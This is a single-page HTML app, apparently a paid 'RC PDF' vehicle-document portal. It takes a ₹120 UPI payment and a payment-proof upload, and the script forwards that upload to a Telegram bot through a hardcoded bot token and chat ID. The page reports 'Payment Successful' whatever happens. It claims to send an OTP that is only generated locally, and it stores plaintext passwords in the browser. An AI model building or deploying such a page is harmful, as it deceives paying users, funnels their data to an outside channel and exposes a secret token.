<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RC PDF Portal</title>

<style>
body{
margin:0;
font-family:Arial;
background:linear-gradient(270deg,red,blue,green,purple,cyan);
background-size:600% 600%;
animation:bg 12s infinite alternate;
display:flex;
flex-direction:column;
align-items:center;
justify-content:center;
min-height:100vh;
}
@keyframes bg{0%{background-position:0%}100%{background-position:100%}}

.home{position:fixed;top:12px;left:12px;background:white;padding:8px 16px;border-radius:10px;font-weight:bold;cursor:pointer}
.card{background:#000c;color:white;padding:25px;border-radius:18px;width:92%;max-width:420px;text-align:center}

input,button{width:100%;padding:12px;margin-top:10px;border:none;border-radius:10px;font-size:16px}
button{background:#00ffd5;font-weight:bold;cursor:pointer}
.hidden{display:none}

#authBox{position:fixed;inset:0;background:rgba(0,0,0,.88);display:flex;align-items:center;justify-content:center}
.authCard{background:white;color:black;padding:28px;width:320px;border-radius:16px;text-align:center}
.authLinks{display:flex;justify-content:space-between;font-size:14px;color:#0a58ca;cursor:pointer}

#userName{
position:fixed;
top:12px;
right:12px;
background:white;
padding:6px 12px;
border-radius:10px;
font-weight:bold;
display:none;
text-align:center
}
</style>
</head>

<body>

<!-- LOGIN -->
<div id="authBox">
<div class="authCard">

<h3 id="authTitle">Login</h3>

<input id="nameField" placeholder="Your Name" style="display:none">
<input id="mobileField" placeholder="Mobile Number">
<input id="passField" type="password" placeholder="Password">

<button onclick="authAction()">Login</button>

<div class="authLinks">
<span onclick="switchSignup()">Signup</span>
<span onclick="showForget()">Forget</span>
</div>

<div id="forgetBox" class="hidden">
<input id="forgetMobile" placeholder="Registered Mobile">
<button onclick="sendOTP()">Send OTP</button>

<input id="otpInput" class="hidden" placeholder="Enter OTP">
<button id="verifyBtn" class="hidden" onclick="verifyOTP()">Verify</button>

<input id="newPass" class="hidden" placeholder="New Password">
<button id="saveBtn" class="hidden" onclick="saveNewPass()">Save</button>
</div>

<p id="authMsg"></p>
</div>
</div>

<div id="userName">
<span id="profileText"></span><br>
<button onclick="logout()" style="background:red;color:white;padding:6px 12px;border:none;border-radius:8px">Logout</button>
</div>

<div class="home" onclick="goHome()">üè† Home</div>

<div class="card">

<div id="p1">
<h3>üöó Enter Vehicle Number</h3>
<input id="vehicle" placeholder="BR-09-AB-1234" oninput="formatVehicle(this)">
<button onclick="goPay()">Continue</button>
</div>

<div id="p2" class="hidden">
<h3>Pay ‚Çπ120</h3>
<img width="220" src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=upi://pay?pa=bestinsurance@upi&pn=BestInsurance&am=120&cu=INR">
<p>UPI ID: bestinsurance@upi</p>
<input id="mobile" placeholder="Mobile Number">
<input type="file" id="proof">
<button onclick="submitPay()">Submit</button>
</div>

<div id="p3" class="hidden">
<h3>Payment Successful</h3>
</div>

</div>

<script>
const token="8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
const chatId="5600045707";

let users = JSON.parse(localStorage.getItem("users")||"{}");
let otpCode="", resetUser="";

function saveUsers(){localStorage.setItem("users",JSON.stringify(users))}

function formatVehicle(el){
el.value = el.value.toUpperCase().replace(/[^A-Z0-9-]/g,"");
}

function switchSignup(){
authTitle.innerText="Signup";
nameField.style.display="block";
}

function authAction(){
let m=mobileField.value.trim();
let p=passField.value.trim();
let n=nameField.value.trim();

if(authTitle.innerText==="Signup"){
 if(!n||!m||!p) return authMsg.innerText="Fill all";
 if(users[m]) return authMsg.innerText="Already exists";
 users[m]={name:n,password:p};
 saveUsers();
 authMsg.innerText="Signup done. Login now";
 authTitle.innerText="Login";
 nameField.style.display="none";
 return;
}

if(!users[m]) return authMsg.innerText="User not found";
if(users[m].password!==p) return authMsg.innerText="Wrong password";

localStorage.setItem("loggedUser",m);
showUser();
authBox.style.display="none";
}

function showUser(){
let m=localStorage.getItem("loggedUser");
if(!m) return;
profileText.innerText="üë§ "+users[m].name;
userName.style.display="block";
}

if(localStorage.getItem("loggedUser")){
showUser();
authBox.style.display="none";
}

function showForget(){
forgetBox.classList.remove("hidden");
}

function sendOTP(){
resetUser = forgetMobile.value.trim();
if(!users[resetUser]) return alert("User not found");

otpCode = Math.floor(100000+Math.random()*900000)+"";
alert("OTP sent successfully");

otpInput.classList.remove("hidden");
verifyBtn.classList.remove("hidden");
}

function verifyOTP(){
if(otpInput.value!==otpCode) return alert("Wrong OTP");

newPass.classList.remove("hidden");
saveBtn.classList.remove("hidden");
}

function saveNewPass(){
users[resetUser].password=newPass.value;
saveUsers();
alert("Password updated");
forgetBox.classList.add("hidden");
}

function logout(){
localStorage.removeItem("loggedUser");
userName.style.display="none";
authBox.style.display="flex";
goHome();
}

function goHome(){
p1.classList.remove("hidden");
p2.classList.add("hidden");
p3.classList.add("hidden");
}

function goPay(){
p1.classList.add("hidden");
p2.classList.remove("hidden");
}

function submitPay(){
let data=new FormData();
data.append("chat_id",chatId);
data.append("photo",proof.files[0]);
fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{method:"POST",body:data})
.then(()=>{
p2.classList.add("hidden");
p3.classList.remove("hidden");
});
}
</script>

</body>
</html>